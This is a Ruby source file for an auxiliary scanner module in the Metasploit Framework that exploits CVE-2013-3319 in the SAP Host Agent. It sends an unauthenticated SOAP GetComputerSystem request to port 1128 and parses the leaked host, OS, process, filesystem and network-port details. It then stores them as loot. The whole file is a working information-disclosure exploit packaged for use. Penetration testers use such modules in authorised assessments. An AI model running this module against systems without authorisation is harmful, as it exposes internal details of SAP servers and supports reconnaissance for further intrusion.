##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rexml/document'

class Metasploit4 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner


	def initialize
		super(
			'Name' => 'SAP Host Agent Information Disclosure',
			'Description' => %q{
				This module attempts to retrieve Computer and OS info from Host Agent
				through the SAP HostControl service
				},
			'References' =>
				[
					# General
					['CVE', '2013-3319'],
					['URL', 'https://service.sap.com/sap/support/notes/1816536'],
					['URL', 'http://labs.integrity.pt/advisories/cve-2013-3319/']
				],
			'Author' =>
				[
					'Bruno Morisson <bm[at]integrity.pt>'
				],
			'License' => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(1128)
			], self.class)

		register_autofilter_ports([1128])


	end

	def initialize_tables

		@computer_table = Msf::Ui::Console::Table.new(
			Msf::Ui::Console::Table::Style::Default,
			'Header' => "Remote Computer Listing",
			'Prefix' => "\n",
			'Postfix' => "\n",
			'Indent' => 1,
			'Columns' =>
				[
					"Names",
					"Hostnames",
					"IPAddresses"
				])

		@os_table = Msf::Ui::Console::Table.new(
			Msf::Ui::Console::Table::Style::Default,
			'Header' => "Remote OS Listing",
			'Prefix' => "\n",
			'Postfix' => "\n",
			'Indent' => 1,
			'Columns' =>
				[
					"Name",
					"Type",
					"Version",
					"TotalMemSize",
					"Load Avg 1m",
					"Load Avg 5m",
					"Load Avg 15m",
					"CPUs",
					"CPU User",
					"CPU Sys",
					"CPU Idle"
				])
		@net_table = Msf::Ui::Console::Table.new(
			Msf::Ui::Console::Table::Style::Default,
			'Header' => "Network Port Listing",
			'Prefix' => "\n",
			'Postfix' => "\n",
			'Indent' => 1,
			'Columns' =>
				[
					"ID",
					"PacketsIn",
					"PacketsOut",
					"ErrorsIn",
					"ErrorsOut",
					"Collisions"
				])

		@process_table = Msf::Ui::Console::Table.new(
			Msf::Ui::Console::Table::Style::Default,
			'Header' => "Remote Process Listing",
			'Prefix' => "\n",
			'Postfix' => "\n",
			'Indent' => 1,
			'Columns' =>
				[
					"Name",
					"PID",
					"Username",
					"Priority",
					"Size",
					"Pages",
					"CPU",
					"CPU Time",
					"Command"
				])

		@fs_table = Msf::Ui::Console::Table.new(
			Msf::Ui::Console::Table::Style::Default,
			'Header' => "Remote Filesystem Listing",
			'Prefix' => "\n",
			'Postfix' => "\n",
			'Indent' => 1,
			'Columns' =>
				[
					"Name",
					"Size",
					"Available",
					"Remote"
				])

		@net_table = Msf::Ui::Console::Table.new(
			Msf::Ui::Console::Table::Style::Default,
			'Header' => "Network Port Listing",
			'Prefix' => "\n",
			'Postfix' => "\n",
			'Indent' => 1,
			'Columns' =>
				[
					"ID",
					"PacketsIn",
					"PacketsOut",
					"ErrorsIn",
					"ErrorsOut",
					"Collisions"
				])

	end

	def parse_computer_info(computer_info)

		success = false
		computer_info.each { |item|

			temp_table =[]

			body = "#{item}"

			item_list = body.scan(/<item><mName>(.+?)<\/mName><mType>(.+?)<\/mType><mValue>(.+?)<\/mValue><\/item>/ix)

			if item_list and "#{item_list}" =~ /ITSAMComputerSystem/

				item_list.each do |m|
					temp_table << "#{m[2]}" unless ("#{m}" =~ /ITSAM/)
				end

				@computer_table << [temp_table[0], temp_table[1], temp_table[2]]
				success = true
			end
		}
		return success
	end

	def parse_os_info(os_info)
		@os_table << [os_info[0], os_info[1], os_info[2], os_info[8], os_info[11], os_info[12], os_info[13],
		              os_info[17], os_info[18]+'%', os_info[19]+'%', os_info[20]+'%']
	end

	def parse_process_info(process_info)
		@process_table << [process_info[0], process_info[1], process_info[2], process_info[3], process_info[4],
		                   process_info[5], process_info[6]+'%', process_info[7], process_info[8]]
	end

	def parse_fs_info(fs_info)
		@fs_table << [fs_info[0], fs_info[2], fs_info[3], fs_info[4]]
	end

	def parse_net_info(net_info)
		@net_table << [net_info[0], net_info[1], net_info[2], net_info[3], net_info[4], net_info[5]]
	end


	def run_host(rhost)

		rport = datastore['RPORT']

		vprint_status("#{rhost}:#{rport} - Connecting to SAP Host Control service")

		data = '<?xml version="1.0" encoding="utf-8"?>'
		data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"'
		data << 'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema">'
		data << '<SOAP-ENV:Header><sapsess:Session xlmns:sapsess="http://www.sap.com/webas/630/soap/features/session/">'
		data << '<enableSession>true</enableSession></sapsess:Session></SOAP-ENV:Header><SOAP-ENV:Body>'
		data << '<ns1:GetComputerSystem xmlns:ns1="urn:SAPHostControl"><aArguments><item>'
		data << '<mKey>provider</mKey><mValue>saposcol</mValue></item></aArguments></ns1:GetComputerSystem>'
		data << "</SOAP-ENV:Body></SOAP-ENV:Envelope>\r\n\r\n"

		begin

			res = send_request_raw(
				{
					'uri' => "/",
					'method' => 'POST',
					'data' => data,
					'headers' => {
						'Content-Type' => 'text/xml; charset=UTF-8',
					}
				})

		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} - Unable to connect to service")
			return
		end

		if res and res.code == 500 and res.body =~ /<faultstring>(.*)<\/faultstring>/i
			faultcode = $1.strip
			vprint_error("#{rhost}:#{rport} - Error code: #{faultcode}")
			return

		elsif res and res.code != 200
			vprint_error("#{rhost}:#{rport} - Error in response")
			return
		end

		initialize_tables()

		vprint_good("#{rhost}:#{rport} - Connected. Retrieving info")

		begin
			response_xml = REXML::Document.new(res.body)
			computer_info = response_xml.elements.to_a("//mProperties/") # Computer info
			detailed_info = response_xml.elements.to_a("//item/mProperties/") # all other info
		rescue
			print_error("#{rhost}:#{rport} - Unable to parse XML response")
			return
		end

		success = parse_computer_info(computer_info)
		# assume that if we can parse the first part, it is a valid SAP XML response

		detailed_info.each { |item|
			temp_table =[]

			# some items have no <mValue>, so we put a dummy with nil
			body = "#{item}".gsub(/\/mType><\/item/, "\/mType><mValue>(nil)<\/mValue><\/item")
			item_list = body.scan(/<item><mName>(.+?)<\/mName><mType>(.+?)<\/mType><mValue>(.+?)
<\/mValue><\/item>/ix)

			if item_list

				item_list.each do |m|
					temp_table << "#{m[2]}" unless ("#{m}" =~ /ITSAM/)
				end

				case "#{item_list}"
				when /ITSAMOperatingSystem/
					parse_os_info(temp_table)

				when /ITSAMOSProcess/
					parse_process_info(temp_table)

				when /ITSAMFileSystem/
					parse_fs_info(temp_table)

				when /ITSAMNetworkPort/
					parse_net_info(temp_table)

				end

			end
		}
		if success
			print_good("#{rhost}:#{rport} - Information retrieved successfully")
		else
			print_error("#{rhost}:#{rport} - Unable to parse reply")
			return
		end

		sap_tables_clean = ''

		[@os_table, @computer_table, @process_table, @fs_table, @net_table].each do |t|
			sap_tables_clean << t.to_s
		end

		vprint_good("#{rhost}:#{rport} - Information retrieved:\n"+sap_tables_clean)

		xml_raw = store_loot(
			"sap.getcomputersystem",
			"text/xml",
			rhost,
			res.body,
			"sap_getcomputersystem.xml",
			"SAP GetComputerSystem XML"
		)

		xml_parsed = store_loot(
			"sap.getcomputersystem",
			"text/plain",
			rhost,
			sap_tables_clean,
			"sap_getcomputersystem.txt",
			"SAP GetComputerSystem XML"
		)

		print_status("#{rhost}:#{rport} - Response stored in #{xml_raw} (XML) and #{xml_parsed} (TXT)")

	end
end
